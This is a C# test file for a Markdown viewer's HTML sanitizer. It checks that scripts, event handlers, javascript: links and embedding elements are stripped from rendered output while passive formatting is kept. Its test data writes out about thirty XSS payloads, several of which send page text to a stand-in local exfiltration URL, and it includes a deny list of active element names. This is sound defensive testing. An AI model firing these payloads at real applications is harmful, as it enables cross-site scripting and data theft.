using AngleSharp.Dom;
using AngleSharp.Html.Parser;
using TigerMarkView.Core.Rendering;

namespace TigerMarkView.Core.Tests.Rendering;

/// <summary>
/// The sanitizing layer: whatever a Markdown document says, the HTML the one pipeline produces carries
/// no script, no event handler, no active URL, and nothing that embeds or submits — while the passive,
/// formatting-oriented HTML people actually write keeps working.
/// </summary>
/// <remarks>
/// Assertions parse the output with an HTML5 parser rather than searching the text, so they judge what
/// a browser would build from it — the same reason the sanitizer parses rather than matches.
/// </remarks>
public class ActiveContentSanitizationTests
{
    private const string Exfil = "http://127.0.0.1:47631/exfil/";

    private static readonly string[] ActiveElements =
    [
        "script", "iframe", "frame", "frameset", "object", "embed", "applet", "portal", "base", "meta",
        "link", "style", "form", "button", "select", "textarea", "video", "audio", "source", "track",
        "template", "noscript", "math", "foreignobject", "animate", "set", "use", "image",
    ];

    public static TheoryData<string, string> HostileDocuments => new()
    {
        { "inline script", $"<script>new Image().src='{Exfil}script?d='+document.body.innerText</script>" },
        { "script source", $"<script src=\"{Exfil}script-src\"></script>" },
        { "script inside svg", $"<svg><script>fetch('{Exfil}svg-script')</script></svg>" },
        { "image error handler", $"<img src=\"missing.png\" onerror=\"fetch('{Exfil}onerror')\">" },
        { "svg load handler", $"<svg onload=\"fetch('{Exfil}svg-onload')\"></svg>" },
        { "details toggle handler", $"<details open ontoggle=\"navigator.sendBeacon('{Exfil}toggle')\"><summary>x</summary></details>" },
        { "autofocus focus handler", $"<input autofocus onfocus=\"fetch('{Exfil}focus')\">" },
        { "body load handler", $"<body onload=\"fetch('{Exfil}body')\">" },
        { "svg animation handler", $"<svg><animate onbegin=\"fetch('{Exfil}animate')\" attributeName=\"x\"></animate></svg>" },
        { "markdown generic attribute handler", $"Paragraph {{onmouseover=\"fetch('{Exfil}generic')\"}}" },
        { "heading generic attribute handler", $"# Heading {{onclick=\"fetch('{Exfil}heading')\"}}" },
        { "javascript link", $"<a href=\"javascript:location='{Exfil}js'\">x</a>" },
        { "entity-obfuscated javascript link", $"<a href=\"jav&#x09;ascript:fetch('{Exfil}entity')\">x</a>" },
        { "markdown javascript link", $"[x](javascript:fetch('{Exfil}markdown-js'))" },
        { "markdown javascript image", $"![x](javascript:fetch('{Exfil}markdown-img'))" },
        { "vbscript link", "<a href=\"vbscript:msgbox(1)\">x</a>" },
        { "data document link", "<a href=\"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E\">x</a>" },
        { "iframe", $"<iframe src=\"{Exfil}iframe\"></iframe>" },
        { "iframe srcdoc", $"<iframe srcdoc=\"&lt;script&gt;fetch('{Exfil}srcdoc')&lt;/script&gt;\"></iframe>" },
        { "object", $"<object data=\"{Exfil}object\"></object>" },
        { "embed", $"<embed src=\"{Exfil}embed\">" },
        { "applet", $"<applet code=\"x\" codebase=\"{Exfil}applet\"></applet>" },
        { "media", $"<video poster=\"{Exfil}poster\" autoplay><source src=\"{Exfil}video\"></video>" },
        { "stylesheet link", $"<link rel=\"stylesheet\" href=\"{Exfil}css\">" },
        { "style element", $"<style>@import url('{Exfil}import'); base[href^=\"file\"] {{ background: url('{Exfil}selector'); }}</style>" },
        { "meta refresh", $"<meta http-equiv=\"refresh\" content=\"0;url={Exfil}refresh\">" },
        { "document base", $"<base href=\"{Exfil}base/\">" },
        { "form", $"<form action=\"{Exfil}form\"><input name=\"q\" value=\"secret\"><button>Send</button></form>" },
        { "noscript mutation", $"<noscript><p title=\"</noscript><img src=x onerror=fetch('{Exfil}noscript')>\"></p></noscript>" },
        { "svg link", $"<svg><a xlink:href=\"javascript:fetch('{Exfil}svg-link')\"><text>x</text></a></svg>" },
        { "anchor ping", $"<a href=\"https://example.com/\" ping=\"{Exfil}ping\">x</a>" },
        { "style expression", "<div style=\"width: expression(alert(1)); background: url(javascript:alert(1))\">x</div>" },
    };

    [Theory]
    [MemberData(nameof(HostileDocuments))]
    public void ActiveContentIsRemovedFromTheRenderedHtml(string vector, string markdown)
    {
        var body = Render(markdown);

        Assert.All(body.QuerySelectorAll("*"), element =>
        {
            Assert.DoesNotContain(element.LocalName, ActiveElements);

            Assert.All(element.Attributes, attribute =>
            {
                Assert.False(
                    attribute.LocalName.StartsWith("on", StringComparison.OrdinalIgnoreCase),
                    $"{vector}: <{element.LocalName}> kept event handler '{attribute.Name}'.");
                Assert.False(
                    attribute.LocalName.Equals("ping", StringComparison.OrdinalIgnoreCase),
                    $"{vector}: <{element.LocalName}> kept a ping list.");
                Assert.False(
                    IsActiveUrl(element, attribute),
                    $"{vector}: <{element.LocalName} {attribute.Name}=\"{attribute.Value}\"> kept an active URL.");
            });
        });

        Assert.DoesNotContain(Exfil, body.InnerHtml.Replace("&amp;", "&"), StringComparison.Ordinal);
    }

    [Fact]
    public void AScriptIsRemovedWithItsTextRatherThanShownAsProse()
    {
        var body = Render("Before\n\n<script>var secret = 1;</script>\n\nAfter");

        Assert.DoesNotContain("secret", body.TextContent, StringComparison.Ordinal);
        Assert.Contains("Before", body.TextContent, StringComparison.Ordinal);
        Assert.Contains("After", body.TextContent, StringComparison.Ordinal);
    }

    [Fact]
    public void AnImageKeepsItsSourceWhenOnlyItsHandlerIsHostile()
    {
        var image = Assert.Single(Render($"<img src=\"diagram.png\" width=\"320\" onerror=\"fetch('{Exfil}x')\">").QuerySelectorAll("img"));

        Assert.Equal("diagram.png", image.GetAttribute("src"));
        Assert.Equal("320", image.GetAttribute("width"));
        Assert.Null(image.GetAttribute("onerror"));
    }

    [Fact]
    public void ALinkKeepsItsTextWhenItsHrefIsRemoved()
    {
        var link = Assert.Single(Render("[Read this](javascript:alert(1))").QuerySelectorAll("a"));

        Assert.Null(link.GetAttribute("href"));
        Assert.Equal("Read this", link.TextContent);
    }

    public static TheoryData<string, string, string, string> PassiveImages => new()
    {
        { "relative Markdown image", "![Diagram](images/diagram.png)", "src", "images/diagram.png" },
        { "parent-relative image", "![Up](../shared/logo.png)", "src", "../shared/logo.png" },
        { "remote Markdown image", "![Badge](https://img.shields.io/badge/x-y-green.svg)", "src", "https://img.shields.io/badge/x-y-green.svg" },
        { "plain-http remote image", "<img src=\"http://example.com/a.png\">", "src", "http://example.com/a.png" },
        { "absolute local image", "<img src=\"file:///C:/Docs/a.png\">", "src", "file:///C:/Docs/a.png" },
        { "inline data image", "<img src=\"data:image/png;base64,iVBORw0KGgo=\">", "src", "data:image/png;base64,iVBORw0KGgo=" },
        { "sized HTML image", "<img src=\"a.png\" width=\"120\" height=\"40\">", "width", "120" },
        { "aligned HTML image", "<img src=\"a.png\" align=\"right\">", "align", "right" },
        { "image alternative text", "<img src=\"a.png\" alt=\"Logo\" title=\"Company logo\">", "alt", "Logo" },
    };

    [Theory]
    [MemberData(nameof(PassiveImages))]
    public void PassiveImagesKeepTheirSourceAndLayout(string description, string markdown, string attribute, string expected)
    {
        var image = Assert.Single(Render(markdown).QuerySelectorAll("img"));

        Assert.True(expected == image.GetAttribute(attribute), $"{description}: expected {attribute}=\"{expected}\", got \"{image.GetAttribute(attribute)}\".");
    }

    public static TheoryData<string, string, string> PassiveMarkup => new()
    {
        { "details and summary", "<details open><summary>More</summary>\n\nHidden **text**.\n\n</details>", "details[open] > summary" },
        { "keyboard keys", "Press <kbd>Ctrl</kbd>+<kbd>C</kbd>.", "kbd" },
        { "subscript and superscript", "H<sub>2</sub>O and x<sup>2</sup>", "sub + sup" },
        { "centred paragraph", "<p align=\"center\">Centred</p>", "p[align=center]" },
        { "inline style", "<div style=\"text-align: right\">Right</div>", "div[style]" },
        { "raw table with spans", "<table><tr><td colspan=\"2\">Wide</td></tr></table>", "td[colspan='2']" },
        { "figure and caption", "<figure><img src=\"a.png\"><figcaption>Caption</figcaption></figure>", "figure > figcaption" },
        { "legacy named anchor", "<a name=\"old-anchor\"></a>", "a[name=old-anchor]" },
        { "in-document link", "[Jump](#section)", "a[href='#section']" },
        { "web link", "[Site](https://example.com/page)", "a[href='https://example.com/page']" },
        { "relative Markdown link", "[Other](other.md)", "a[href='other.md']" },
        { "mail link", "<mailto:someone@example.com>", "a[href='mailto:someone@example.com']" },
        { "heading identifier", "## Getting started", "h2#getting-started" },
        { "generic attribute id and class", "# Title {#custom .note}", "h1#custom.note" },
        { "fenced code language", "```csharp\nvar x = 1;\n```", "pre > code.language-csharp" },
        { "table alignment", "| A |\n|--:|\n| 1 |", "td[style]" },
        { "task list checkbox", "- [x] Done", "li.task-list-item > input[type=checkbox][disabled][checked]" },
        { "footnote", "Text[^1]\n\n[^1]: Note.", "a.footnote-ref[href='#fn:1']" },
        { "alert icon", "> [!NOTE]\n> Careful.", "p.markdown-alert-title > svg > path[d]" },
        { "abbreviation", "<abbr title=\"HyperText Markup Language\">HTML</abbr>", "abbr[title]" },
    };

    [Theory]
    [MemberData(nameof(PassiveMarkup))]
    public void PassiveFormattingHtmlIsKept(string description, string markdown, string selector)
    {
        Assert.True(Render(markdown).QuerySelector(selector) is not null, $"{description}: nothing matched '{selector}'.");
    }

    [Fact]
    public void SyntaxHighlightingSpansAreKept()
    {
        var html = MarkdownRenderer.ToHtmlFragment(
            "```csharp\nvar x = 1; // note\n```",
            new MarkdownRenderingOptions(EmojiShortcodes: false, SyntaxHighlighting: true));

        var body = Parse(html);

        Assert.NotNull(body.QuerySelector("pre > code span.syn-keyword"));
        Assert.NotNull(body.QuerySelector("pre > code span.syn-comment"));
    }

    [Fact]
    public void AFormControlThatIsNotATaskCheckboxIsRemoved()
    {
        var body = Render("<input type=\"text\" value=\"secret\"> <input type=\"checkbox\" checked>");

        var input = Assert.Single(body.QuerySelectorAll("input"));
        Assert.Equal("checkbox", input.GetAttribute("type"));
        Assert.NotNull(input.GetAttribute("disabled"));
    }

    private static IElement Render(string markdown) => Parse(MarkdownRenderer.ToHtmlFragment(markdown));

    private static IElement Parse(string html) =>
        new HtmlParser().ParseDocument($"<!doctype html><html><body>{html}</body></html>").Body!;

    private static readonly string[] UrlAttributes =
    [
        "href", "src", "cite", "longdesc", "action", "formaction", "data", "poster", "background",
        "codebase", "srcset", "xlink:href",
    ];

    private static bool IsActiveUrl(IElement element, IAttr attribute)
    {
        var value = attribute.Value.Trim();

        if (attribute.LocalName.Equals("style", StringComparison.OrdinalIgnoreCase))
        {
            return value.Contains("expression(", StringComparison.OrdinalIgnoreCase)
                || value.Contains("javascript:", StringComparison.OrdinalIgnoreCase);
        }

        if (!UrlAttributes.Contains(attribute.Name, StringComparer.OrdinalIgnoreCase)
            || value.Length == 0
            || !Uri.TryCreate(value, UriKind.Absolute, out var uri))
        {
            return false;
        }

        if (uri.Scheme is "http" or "https" or "mailto" or "file")
        {
            return false;
        }

        // An inline picture is the one place a data: URL is passive.
        return !(uri.Scheme == "data"
                 && element.LocalName == "img"
                 && attribute.LocalName == "src"
                 && value.StartsWith("data:image/", StringComparison.OrdinalIgnoreCase));
    }
}
